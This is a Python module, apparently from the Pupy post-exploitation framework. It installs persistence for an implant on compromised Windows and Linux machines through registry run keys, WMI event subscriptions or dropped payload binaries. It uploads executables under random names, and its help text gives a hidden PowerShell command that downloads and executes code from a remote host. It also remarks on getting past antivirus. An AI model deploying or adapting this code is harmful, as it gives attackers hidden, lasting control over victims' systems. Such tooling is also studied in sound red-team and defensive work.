# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
import random
import pupygen
import os.path
import stat
import string

__class_name__="PersistenceModule"

@config(cat="manage", compat=['linux', 'windows'])
class PersistenceModule(PupyModule):
    """ Enables persistence via registry keys """

    dependencies = {
        'linux': [ 'persistence' ],
        'windows': [ 'pupwinutils.persistence' ]
    }

    def init_argparse(self):
        example = 'Examples:\n'
        example += '>> run persistence -c "powershell.exe -w hidden -noni -nop -c \\\"iex(New-Object System.Net.WebClient).DownloadString(\'http://192.168.0.15:8080/eiloShaegae1\')\\\""\n'
        example += '>> run persistence -e \'/tmp/pupy.exe\' -m wmi\n'
        example += '>> run persistence -m wmi --remove\n'
        self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__, epilog=example)
        self.arg_parser.add_argument('-e', '--exe', help='Use an alternative file and set persistency', completer=path_completer)
        self.arg_parser.add_argument('-c', '--cmd', help='Use a command instead of a file')
        self.arg_parser.add_argument('-s', '--shared', action='store_true', default=False,
                                         help='prefer shared object')
        self.arg_parser.add_argument('--remove', action='store_true', help='try to remove persistency instead of enabling it')
        self.arg_parser.add_argument('-m', '--method', choices=['registry', 'wmi'], default='registry', help='change the default persistency method. This argument is ignored on linux')

    def run(self, args):
        if self.client.is_windows():
            self.windows(args)
        else:
            self.linux(args)

    def linux(self, args):
        if args.remove:
            #TODO persistency removal
            self.error("not implemented for linux")
            return
        manager = self.client.conn.modules['persistence'].DropManager()
        self.success('Available methods: ' + ', '.join(
            method for method,state in manager.methods.iteritems() if state is True
        ))

        for method, result in manager.methods.iteritems():
            if result is not True:
                self.error('Unavailable method: {}: {}'.format(method, result))

        exebuff, tpl, _ = pupygen.generate_binary_from_template(
            self.client.get_conf(),
            self.client.desc['platform'],
            arch=self.client.arch,
            shared=args.shared
        )

        self.success("Generating the payload with the current config from {} - size={}".format(
            tpl, len(exebuff)))

        if args.shared:
            drop_path, conf_path = manager.add_library(exebuff)
        else:
            drop_path, conf_path = manager.add_binary(exebuff)

        if drop_path and conf_path:
            self.success('Dropped: {} Config: {}'.format(drop_path, conf_path))
        else:
            self.error('Couldn\'t make service persistent.')

    def windows(self, args):
        if args.remove:
            # removing persistency from registry
            if args.method=="registry":
                self.info("removing persistence from registry ...")
                if self.client.conn.modules['pupwinutils.persistence'].remove_registry_startup():
                    self.info("persistence removed !")
                else:
                    self.error("error removing registry persistence")

            # removing persistency from wmi event
            elif args.method=="wmi":
                self.info("removing wmi event ...")
                if (self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System") or self.client.conn.modules['sys'].getwindowsversion()[0] < 6:
                    self.warning("You seems to lack some privileges to remove wmi persistence ...")
                if self.client.conn.modules['pupwinutils.persistence'].remove_wmi_persistence():
                    self.success("persistence removed !")
                else:
                    self.error("error removing wmi persistence")
            return

        exebuff=b""
        cmd=None
        remote_path=None
        if args.exe:
            with open(args.exe,'rb') as f:
                exebuff=f.read()
            self.info("loading %s ..."%args.exe)
            remote_path=self.client.conn.modules['os.path'].expandvars("%ProgramData%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
            self.info("uploading to %s ..."%remote_path)
            #uploading
            rf=self.client.conn.builtin.open(remote_path, "wb")
            chunk_size=16000
            pos=0
            while True:
                buf=exebuff[pos:pos+chunk_size]
                if not buf:
                    break
                rf.write(buf)
                pos+=chunk_size
            rf.close()
            self.success("upload successful")
            cmd = remote_path
        elif args.cmd:
            cmd = args.cmd
        else:
            self.error("A command line or an executable is needed on windows (standard templates will get caught by the AV)")
            return


        if args.method=="registry":
            # adding persistency in registry (for xp, it will always be in registry)
            self.info("adding to registry ...")
            if self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(cmd):
                self.success("persistence added in registry !")
            else:
                self.error("an error occured creating the registry persistence, try to do it manually")
            # adding persistency using wmi event
        elif args.method=="wmi":
            if (self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System") or self.client.conn.modules['sys'].getwindowsversion()[0] < 6:
                self.warning("You seems to lack some privileges to remove wmi persistence ...")
            self.info("creating wmi event ...")
            if self.client.conn.modules['pupwinutils.persistence'].wmi_persistence(command=cmd, file=remote_path):
                self.success("persistence added using wmi!")
            else:
                self.error("an error occured creating the wmi persistence, try to do it manually")
